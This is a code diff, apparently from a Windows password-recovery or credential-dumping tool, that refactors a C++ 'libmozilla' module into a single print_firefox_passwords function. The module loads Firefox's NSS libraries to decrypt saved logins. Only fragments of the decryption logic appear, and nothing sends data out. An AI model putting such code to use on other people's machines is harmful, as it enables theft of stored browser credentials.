@@ -85,10 +85,6 @@ PL_Base64DecodeFunc PLBase64Decode;
 PK11_SDRDecryptFunc PK11SDRDecrypt;
 SECITEM_ZfreeItemFunc SECITEMZfreeItem;
 
-bool libmozilla::initialized = false;
-HMODULE libmozilla::hnss3Lib = false;
-HMODULE libmozilla::hmozglueLib = false;
-
 #define PR_TRUE  1
 #define PR_FALSE 0
 
@@ -140,7 +136,7 @@ static void _handle_credentials(std::string hostname, std::string encUsername, s
 	plaintext = NULL;
 	SECITEMZfreeItem(&request, PR_FALSE);
 	SECITEMZfreeItem(&reply, PR_FALSE);
-	
+
 	//***************
 
 	adjust = 0;
@@ -288,8 +284,9 @@ static void _handle_profiles(std::wstring folder, std::wstring searchpath, std::
 	FindClose(hFind);
 }
 
-void libmozilla::init(std::wstring nss3Dll, std::wstring mozglueDll) {
-	if (initialized) return;
+void libmozilla::print_firefox_passwords(std::wstring path, std::wstring signons, std::wstring nss3Dll, std::wstring mozglueDll) {
+	HMODULE hnss3Lib;
+	HMODULE hmozglueLib;
 
 	if (!(hmozglueLib = LoadLibraryW(mozglueDll.c_str()))) {
 		return;
@@ -317,11 +314,11 @@ void libmozilla::init(std::wstring nss3Dll, std::wstring mozglueDll) {
 		return;
 	}
 
-	initialized = true;
-}
+	if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
+		return;
+	}
 
-void libmozilla::finalize(void) {
-	if (!initialized) return;
+	_handle_profiles(path, path + L"\\*", signons);
 
 	if (hnss3Lib) {
 		FreeLibrary(hnss3Lib);
@@ -330,16 +327,4 @@ void libmozilla::finalize(void) {
 	if (hmozglueLib) {
 		FreeLibrary(hmozglueLib);
 	}
-
-	initialized = false;
-}
-
-void libmozilla::print_firefox_passwords(std::wstring path, std::wstring signons) {
-	if (!initialized) return;
-
-	if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
-		return;
-	}
-
-	_handle_profiles(path, path + L"\\*", signons);
 }
